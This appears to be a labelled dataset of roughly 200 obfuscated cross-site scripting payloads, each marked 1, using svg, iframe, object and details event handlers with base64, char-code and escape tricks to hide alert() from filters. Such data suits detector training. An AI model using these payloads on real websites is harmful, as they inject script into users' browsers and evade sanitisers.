<iframe srcdoc='<svg onload=eval(atob(&#34;d2luZG93WydhbGVydCddKDEp&#34;))>'></iframe>,1
"<iframe srcdoc='<img src=x onerror=window[unescape(""%61lert"")](1)>'></iframe>",1
"<svg onload=""setTimeout(&quot;&#97;&#108;&#101;&#114;&#116&#40;1&#41;&quot;,0)"">",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)')) />,1
"<iframe srcdoc=""<script>Function('\x61\x6c\x65\x72\x74(28)')()</script>""></iframe>",1
"<svg onload=setTimeout(atob('YWxlcnQoMSk='),0)>",1
"<iframe/src=""javascript:eval(atob('YWxlcnQoMSk='))"">",1
"<object data=""data:text/html,<svg onload=window['\x61\x6c\x65\x72\x74'](1) />""></object>",1
"<iframe src=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+Cg=="">",1
"<iframe srcdoc=""<img src=x onerror=eval(atob('YWxlcnQoMTEwKQ=='))>"">",1
<iframe srcdoc='<img src=x onerror=eval(atob(&#39;d2luZG93WydhbGVydCddKDEp&#39;))>'></iframe>,1
"<iframe srcdoc=""<svg onload=window['al'+String.fromCharCode(101,114,116)](1)>""></iframe>",1
<svg onload=window['ev'+'al'](atob('YWxlcnQoMSk='))>,1
"<details open ontoggle=setTimeout(`al`+`ert(1)`,0)></details>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74).concat(String.fromCharCode(0x28,0x31,0x30,0x30,0x29)))</script>""></iframe>",1
"<iframe srcdoc=""<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+'>"" ></iframe>",1
"<svg onload=setTimeout(`al${String.fromCharCode(101,114,116)}(1)`,0)>",1
"<svg onload=window['al'+'ert'].apply(null,[1])>",1
"<object data='data:text/html,<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>'></object>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%281%29'))></svg>,1
"<iframe srcdoc=""<svg onload=setTimeout(`window['al'+'ert'](1)`,0)>""></iframe>",1
"<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></object>",1
"<iframe srcdoc=""<svg onload='setTimeout(`alert(28)`,0)'>"">",1
"<iframe srcdoc=""<script>window['al'+'ert'](0x31)</script>"">",1
"<svg onload=window['al'+'ert'].call(null,1)>",1
"<iframe srcdoc=""<script>setTimeout(function(){window['al'+'ert'](1)},0)</script>""></iframe>",1
"<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61%6c%65%72%74%28%31%32%33%29'))></svg>""></iframe>",1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></svg>",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>""></iframe>",1
<svg onload=eval(unescape('%61%6c%65%72%74(49)'))>,1
"<iframe srcdoc=""<script>eval(decodeURIComponent('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%64%6F%6D%61%69%6E%29'))</script>"">",1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('al'+'ert(1)',0)>""></iframe>",1
"<iframe srcdoc=""<script>setInterval(function(){alert(1)}, 1000)</script>"">",1
"<svg onload=""eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))""></svg>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>",1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%281%29'))></svg>,1
"<iframe srcdoc='<svg onload=setTimeout(`al`+`ert(1)`,0)>'></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>""></iframe>",1
"<iframe srcdoc=""<svg onload='&#x61;&#x6c;&#x65;&#x72;&#x74;(`12`)'>"">",1
"<svg onload=""setTimeout(atob('YWxlcnQoMSk='),0)"">",1
"<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,32,46,32,97,108,101,114,116,40,49,41))>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(atob('YWxlcnQ=')+'(1)',0)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](1)>""></iframe>",1
"<iframe srcdoc='<object data=""data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+""></object>'>",1
"<iframe srcdoc=""<svg onload=eval(`al\x65rt(1)`)></svg>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',10)>""></iframe>",1
"<iframe srcdoc=""<svg><script>const f=Function;f('ale'+'rt(1)')()</script>"">",1
"<object data=""data:text/html,<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>""></object>",1
"<iframe srcdoc=""<svg onload=eval(`\u0061\u006c\u0065\u0072\u0074(1)`)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>""></iframe>",1
<svg onload=eval(unescape('%77%69%6e%64%6f%77%2e%61%6c%65%72%74%28%31%29'))>,1
"<iframe srcdoc=""<svg onload=setTimeout(&#x27;alert(1)&#x27;,0)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')>""></iframe>",1
"<iframe srcdoc='<svg onload=window[""al""+""ert""](1)>'></iframe>",1
<svg onload=window[`\u0061lert`](1)>,1
"<iframe srcdoc=""<svg onload=window['al'+'\u0065rt'](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window[decodeURIComponent('%61%6c%65%72%74')](1)>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=window['\x61\x6c\x65\x72\x74'](1)>"">",1
"<object data=""data:text/html,<svg onload=window['al'+'ert'](1)>""></object>",1
"<object type=""text/x-scriptlet"" data='data:text/html;charset=utf-7,<script>alert(1)</script>'></object>",1
"<iframe srcdoc=""<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout('ev'+'al(`\\u0061lert(1)`)')>""></iframe>",1
"<svg onload='eval(atob(""YWxlcnQoMTExKQ==""))'>",1
"<svg onload='setTimeout(() => window[""al""+""ert""](50), 0)'>",1
<svg onload=eval('&#x61;&#x6c;&#x65;&#x72;&#x74;(1)')>,1
"<iframe srcdoc=""<svg onload=window['\u0061\u006c\u0065\u0072\u0074'](1) />""></iframe>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116))(1)>",1
<details open ontoggle=window['al'+'ert'](1)>,1
"<iframe srcdoc=""<object data='data:text/html,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot;><script>window[&quot;al&quot;+&quot;ert&quot;](5)</script></svg>'></iframe>"">",1
"<svg onload=window[""a""+""l""+""ert""](1)>",1
<svg onload=eval(atob('YWxlcnQoMTEwKQ=='))>,1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](String.raw`1`)>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))>""></iframe>",1
"<svg onload='eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,49,41))'></svg>",1
"<svg onload='eval(atob(""YWxlcnQoMSk=""))'></svg>",1
"<svg/onload='[].map.constructor(""al""+""er""+""t""+""\x28""+""1\x29"")()'>",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"" ></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al`+`ert(1)`,0)>""></svg>",1
"<svg onload='eval(unescape(""%61%6c%65%72%74(1)""))'></svg>",1
"<svg onload=setTimeout(`;\u0061lert(1)`,0)>",1
<svg onload=top[&quot;a&quot;+&quot;ler&quot;+&quot;t&quot;](1)>,1
<iframe srcdoc='<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>'></iframe>,1
"<object data='data:text/html;base64,PHN2ZyBvbmxvYWQ9d2luZG93WyJhbGVydCJdKDEpPg=='></object>",1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>,1
"<iframe srcdoc=""<img src=x onerror=window['al'+'ert'](1)>"">",1
"<svg onload=setTimeout(window['al'+'ert'](1),0)>",1
<svg onload=location='javascript:'+unescape('%61%6C%65%72%74(1)')>,1
"<iframe/src=""javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"">",1
<svg onload=window[atob('YWxlcnQ=')](1)>,1
"<iframe srcdoc=""<script>setTimeout('&#x61;&#108;&#101;&#114;&#116;(`4`)', 0)</script>"">",1
"<iframe srcdoc='<script>new Function(""return eval"")()(unescape(""%61%6c%65%72%74%28%31%29""))</script>'>",1
<svg onload=window[`\x61\x6c\x65\x72\x74`](1)>,1
"<iframe src=""javascript:eval('\x61\x6c\x65\x72\x74(3)')"">",1
"<svg onload='Function(""alert(46)"")()'>",1
"<iframe srcdoc=""<svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>""></iframe>",1
<svg onload=window[unescape('%61lert')](1)>,1
"<svg onload=""setTimeout('al'+'ert(1)')"">",1
"<svg onload='eval(decodeURIComponent(""%61%6c%65%72%74%28%31%31%31%29""))'>",1
"<svg onload='new Function(""al"" + ""ert(10)"")()'>",1
"<svg onload=Function('window[""al""+""ert""](1)')()></svg>",1
"<iframe srcdoc=""<img src=x onerror='eval(`al\x65rt(32)`)'>"">",1
"<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent(""%61%6C%65%72%74(1)""))>'></iframe>",1
<details open ontoggle=window['a'+'l'+'ert'](1)>,1
<svg onload=eval(decodeURIComponent('%61%6C%65%72%74(1)'))>,1
"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101,114,116,40,49,41))>",1
"<iframe srcdoc=""<img src=x onerror='window[`al`+`ert`](1)'>""></iframe>",1
<svg onload=setTimeout('ev'+'al(`al\\u0065rt(1)`)')>,1
"<iframe srcdoc=""<script>setTimeout(function(){window['ale'+'rt'](1)},0)</script>""></iframe>",1
"<iframe srcdoc=""<svg onload='setTimeout(() => eval(String.fromCharCode(97,108,101,114,116,40,49,41)), 0)'></svg>""></iframe>",1
"<svg onload=""setTimeout(function(){aler&#116;(&#34;X&#83;&#83;&#34;)})"">",1
<svg onload='&#x61;&#x6C;&#x65;&#x72;&#x74;`1`'>,1
"<svg onload=setTimeout('eval(atob(""YWxlcnQoMSk=""))',0)>",1
"<object data=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+></object>",1
"<object data=""data:text/html,<img src=x onerror=setTimeout('alert(1)',0)>""></object>",1
"<iframe srcdoc=""<img src=x onerror=window['eval']('al'+'ert(1)')>""></iframe>",1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))></svg>,1
"<iframe srcdoc=""<meta charset='utf-8'><img src=x onerror=window['a'+unescape('%6Ce%72t')](1)>"">",1
"<svg onload='eval(atob(""d2luZG93LmFsZXJ0KDEp""))'></svg>",1
<svg onload=eval(atob('YWx'+'lcnQoMSk='))>,1
"<iframe srcdoc='<svg onload=setTimeout(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+""(1)"",0)>'></iframe>",1
"<iframe srcdoc=""<script>setTimeout(() => window['al'+'ert'](1), 0)</script>""></iframe>",1
"<svg onload=setInterval('al'+'ert(1)',1000)></svg>",1
<details open ontoggle=eval(decodeURI('%61%6C%65%72%74%28%31%29'))></details>,1
"<iframe srcdoc=""<img src=x onerror=setTimeout(`ale`+'rt(1)',0)>""></iframe>",1
"<iframe srcdoc=""<script>setInterval(()=>window[`al`+'ert']('XSS'),1000)</script>"">",1
<details open ontoggle=eval('al'+'ert(3)')>,1
"<iframe srcdoc=""<img src=x onerror=eval(String.fromCharCode(0x61)+String.fromCharCode(0x6c)+String.fromCharCode(0x65)+String.fromCharCode(0x72)+String.fromCharCode(0x74)+'(111)')>"">",1
"<svg onload=eval(String.fromCharCode(...[97,108,101,114,116,40,49,41]))>",1
"<iframe src=""javascript:var script=document.createElement('script');script.innerText=String.fromCharCode(97,108,101,114,116,40,52,50,41);document.body.appendChild(script)""></iframe>",1
"<object data=""data:text/html,<svg onload=eval(atob('YWxlcnQoMSk='))>""></object>",1
"<svg onload=eval(eval('Str'+'ing.fromCharCode')(97,108,101,114,116,40,53,41))>",1
"<iframe srcdoc=""<script>window['ale'+'rt'](1)</script>""></iframe>",1
"<svg onload='window[String.fromCharCode(97,108,101,114,116)](1)'></svg>",1
"<iframe srcdoc=""<svg onload=eval(unescape('%61lert(1)'))>""></iframe>",1
"<object data=""data:text/html,<svg onload=window%5b%22al%22+%22ert%22%5d(1)></svg>""></object>",1
<svg onload=eval('al'+'ert(10)')>,1
"<svg onload=setTimeout('eval(String.fromCharCode(97,108,101,114,116))(1)',0)>",1
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#66;&#39;&#41;>,1
<svg onload=eval(decodeURIComponent('%61%6c%65%72%74(1)'))>,1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMik=""))>'></iframe>",1
"<iframe srcdoc=""<script>setTimeout(function(){alert(1)}, 0)</script>"">",1
"<iframe srcdoc=""<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(String.fromCharCode(97,108,101,114,116)+'(1)',0)>""></iframe>",1
"<svg onload='eval(atob(""YWxlcnQoMTQp""))'>",1
"<iframe srcdoc=""<svg onload=setTimeout(`al\u0065rt(1)`,0)>""></iframe>",1
"<iframe srcdoc='<svg onload=eval(atob(""YWxlcnQoMSk=""))>'></iframe>",1
"<svg onload='window[""\u0061\u006c\u0065\u0072\u0074""](1)'></svg>",1
"<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,50,41))>",1
"<svg onload='setInterval(""\u0061\u006c\u0065\u0072\u0074(1)"",1)'>",1
"<object data=""data:text/html,<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></object>",1
"<iframe srcdoc=""<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>""></iframe>",1
"<iframe srcdoc=""<script>window['al'+'ert'](0x1)</script>"">",1
"<iframe srcdoc=""<img src=x onerror=setInterval('al'+'ert(1)',1000)>""></iframe>",1
"<iframe srcdoc=""<svg onload=setTimeout(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`,0)>""></iframe>",1
"<iframe srcdoc=""<script>(Function('alert(1)')())</script>""></iframe>",1
<svg onload=window['al'+'ert'](1)>,1
"<iframe srcdoc=""<svg onload=window[`al`+`ert`](1)>""></iframe>",1
"<svg onload=""new Function('\u0061\x6C\x65\x72\x74(10)')()"">",1
<svg onload=eval(String.fromCharCode(97)+unescape('%6c%65%72%74(1)'))>,1
"<iframe srcdoc=""<script>alert&NewLine;&lpar;'XSS'&rpar;</script>"">",1
"<iframe srcdoc=""<svg onload=eval('&#x61;&#x6C;&#x65;&#x72;&#x74;(1)')>""></iframe>",1
"<iframe srcdoc=""<img src='x' onerror=eval(atob('YWxlcnQoMSk='))>""></iframe>",1
"<iframe srcdoc=""<img src=x onerror=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)>"" />",1
"<svg onload=eval(String.fromCodePoint(97,108,101,114,116,40,49,41))>",1
"<svg onload=eval(String.fromCharCode(97)+String.fromCharCode(108,101)+String.fromCharCode(114,116,40,49,41))>",1
"<svg onload='(new Function(""alert(42)""))()'>",1
<svg onload=setTimeout('eval(`\\u0061lert(1)`)')>,1
"<object data=""data:text/html,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>""></object>",1
<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>,1
"<iframe srcdoc=""<details open ontoggle=eval(decodeURIComponent('%61%6C%65%72%74(1)'))></details>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(atob('YWxlcnQoMSk='))>"">",1
"<details open ontoggle=""setTimeout('al'+'ert(1)',0)""></details>",1
"<svg onload=import('data:text/javascript,al%65rt(123)')>",1
<svg onload=window['al'+'\x65rt'](1)>,1
<details open ontoggle=window['\u0061\u006c\u0065\u0072\u0074'](1)></details>,1
"<svg onload=setInterval('al'+'ert(1)',0)>",1
"<svg onload=""new Function('al'+'ert(1)')()"">",1
"<iframe/src=""javascript:eval(unescape('%61%6c%65%72%74%28%31%29'))"">",1
<details open ontoggle=window['al'+'\x65rt'](1)>,1
"<iframe srcdoc=""<img src=x onerror=eval(decodeURIComponent(&#x27;%61%6C%65%72%74(1)&#x27;))>""></iframe>",1
"<iframe src=""javascript:((()=>{window[`al`+`ert`](1)})())""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></iframe>"">",1
"<iframe srcdoc=""<img src=x onerror=eval('al'+String.fromCharCode(101,114,116)+'(1)')>""></iframe>",1
"<iframe srcdoc=""<svg onload=window[&#x27;al&#x27;+&#x27;ert&#x27;](1)>""></iframe>",1
"<svg onload=""this.constructor.constructor('al'+'ert(1)')()"">",1
"<iframe srcdoc=""<svg onload='eval(atob(`YWxlcnQoMzYp`))'>"">",1
"<iframe srcdoc=""<script>let e=atob('YWxlcnQoMSk=');eval(e)</script>"">",1
"<iframe srcdoc=""<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"" >",1
"<svg onload=eval(String.fromCharCode(97,108)+String.fromCharCode(101,114,116)+'(1)')>",1
"<iframe srcdoc='<img src=x onerror=eval(decodeURIComponent(""%61%6c%65%72%74%281%29""))>'></iframe>",1
